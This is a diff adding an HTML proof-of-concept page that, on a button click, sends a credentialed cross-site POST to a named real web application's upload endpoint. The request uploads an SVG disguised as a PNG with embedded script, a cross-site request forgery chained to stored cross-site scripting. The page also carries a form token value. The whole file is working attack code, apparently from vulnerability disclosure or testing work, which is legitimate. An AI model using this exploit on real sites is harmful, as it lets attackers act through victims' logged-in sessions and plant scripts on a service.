@@ -1,0 +1,74 @@
+
+<html>
+  
+  <body>
+    <script>
+      function submitRequest()
+      {
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", "https://app.goodhire.com/member/send-mail-file-uploaded ", true);
+        xhr.setRequestHeader("Accept", "*/*");
+        xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
+        xhr.setRequestHeader("Content-Type", "multipart/form-data; boundary=---------------------------462067844673386556369027002");
+        xhr.withCredentials = true;
+        var body = "-----------------------------462067844673386556369027002\r\n" + 
+          "Content-Disposition: form-data; name=\"token\"\r\n" + 
+          "\r\n" + 
+          "VmpFPSxNakF4TnkweE1DMHlOVlF3TWpvME5EbzBNQzR3TlRsYSxWb3dVeW1DQ3pZYlVEejZhaDVMcEJoLE1XTm1NVEJr\r\n" + 
+          "-----------------------------462067844673386556369027002\r\n" + 
+          "Content-Disposition: form-data; name=\"fileName_upload\"\r\n" + 
+          "\r\n" + 
+          "evilsvgfile\r\n" + 
+          "-----------------------------462067844673386556369027002\r\n" + 
+          "Content-Disposition: form-data; name=\"fileName\"\r\n" + 
+          "\r\n" + 
+          "evilsvgfile\r\n" + 
+          "-----------------------------462067844673386556369027002\r\n" + 
+          "Content-Disposition: form-data; name=\"desc_upload\"\r\n" + 
+          "\r\n" + 
+          "\r\n" + 
+          "-----------------------------462067844673386556369027002\r\n" + 
+          "Content-Disposition: form-data; name=\"desc\"\r\n" + 
+          "\r\n" + 
+          "\r\n" + 
+          "-----------------------------462067844673386556369027002\r\n" + 
+          "Content-Disposition: form-data; name=\"hiddenFileName\"\r\n" + 
+          "\r\n" + 
+          "evilsvgfile\r\n" + 
+          "-----------------------------462067844673386556369027002\r\n" + 
+          "Content-Disposition: form-data; name=\"shareOption_upload\"\r\n" + 
+          "\r\n" + 
+          "pvt\r\n" + 
+          "-----------------------------462067844673386556369027002\r\n" + 
+          "Content-Disposition: form-data; name=\"mfu\"\r\n" + 
+          "\r\n" + 
+          "1\r\n" + 
+          "-----------------------------462067844673386556369027002\r\n" + 
+          "Content-Disposition: form-data; name=\"file\"; filename=\"evilsvgfile.png\"\r\n" + 
+          "Content-Type: image/png\r\n" + 
+          "\r\n" + 
+          "\x3c?xml version=\"1.0\" standalone=\"no\"?\x3e\r\n" + 
+          "\x3c!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\"\x3e\r\n" + 
+          "\r\n" + 
+          "\x3csvg version=\"1.1\" baseProfile=\"full\" xmlns=\"http://www.w3.org/2000/svg\"\x3e\r\n" + 
+          "   \x3cpolygon id=\"triangle\" points=\"0,0 0,50 50,0\" fill=\"#009900\" stroke=\"#004400\"/\x3e\r\n" + 
+          "   \x3cscript type=\"text/javascript\"\x3e\r\n" + 
+          "      alert(\'This app is probably vulnerable to XSS attacks!\');\r\n" + 
+          "   \x3c/script\x3e\r\n" + 
+          "\x3c/svg\x3e\r\n" + 
+          "-----------------------------462067844673386556369027002\r\n" + 
+          "Content-Disposition: form-data; name=\"fpid\"\r\n" + 
+          "\r\n" + 
+          "00D7F000001xWff\r\n" + 
+          "-----------------------------462067844673386556369027002--\r\n";
+        var aBody = new Uint8Array(body.length);
+        for (var i = 0; i < aBody.length; i++)
+          aBody[i] = body.charCodeAt(i); 
+        xhr.send(new Blob([aBody]));
+      }
+    </script>
+    <form action="#">
+      <input type="button" value="Submit request" onclick="submitRequest();" />
+    </form>
+  </body>
+</html>
